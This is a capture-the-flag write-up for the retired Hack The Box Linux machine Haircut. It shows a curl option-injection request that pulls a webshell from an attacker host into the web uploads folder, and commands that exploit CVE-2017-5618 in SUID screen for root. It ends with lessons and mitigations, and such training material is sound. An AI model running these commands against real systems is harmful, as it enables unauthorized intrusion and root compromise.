---
machine: Haircut
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, php, curl, parameter-injection, screen, privesc]
---

# Haircut — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

`exposed.php` passes user input to `curl` without sanitizing it. Parameter injection writes a webshell to `uploads/` and gives `www-data`. The SUID `screen` 4.5.0 is vulnerable to CVE-2017-5618: write `/etc/ld.so.preload` and obtain a root SUID shell.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` nginx with a hairdresser site.
- `gobuster` finds `/exposed.php`, `/uploads` and `/upload.php`.
- `exposed.php` has a form that takes a URL and runs `curl`.

## Enumeration

The equivalent code is:

```php
system('curl ' . $_POST["formurl"] . ' /path/to/some/directory');
```

Input is not validated, so `curl` options can be injected.

## Foothold

Use `-o` to write a webshell into the served directory.

```bash
curl -X POST http://<IP>/exposed.php \
  --data-urlencode 'formurl=http://<ATTACKER>/shell.php -o /var/www/html/uploads/shell.php' \
  --data-urlencode 'submit=go'
```

Then visit `/uploads/shell.php?cmd=id` and get `www-data`.

## Lateral movement

There is no intermediate user; the `www-data` shell is enough for escalation.

## Privilege escalation

`screen` 4.5.0 is SUID. CVE-2017-5618 writes `/etc/ld.so.preload` with `-L` and then loads a malicious library when `screen` runs again. The library creates a SUID `/tmp/rootshell`.

```bash
screen-4.5.0 -D -m -L ld.so.preload echo -ne '\x0a/tmp/libhax.so'
screen-4.5.0 -ls
/tmp/rootshell
```

## Evidence

- `exposed.php` and unsanitized `curl`.
- Webshell in `uploads/`.
- SUID `screen` and CVE-2017-5618.
- `/etc/ld.so.preload` and root.

## Lessons learned

- Passing input to `curl` allows option injection and file writes.
- A webshell in a served directory is direct execution.
- A vulnerable SUID binary can escalate from `www-data`.
- `ld.so.preload` is a classic escalation target.

## Mitigation and detection

- Use `escapeshellarg` or a URL allowlist.
- Do not allow writes to served directories.
- Update `screen` and review SUID binaries.
- Monitor changes to `/etc/ld.so.preload`.

## References

- [0xdf — Haircut](https://0xdf.gitlab.io/2020/09/10/htb-haircut.html)
- [IppSec — Haircut](https://www.youtube.com/watch?v=9ZXG1qb8lUI)
- [Hack The Box — Haircut](https://app.hackthebox.com/machines/haircut)
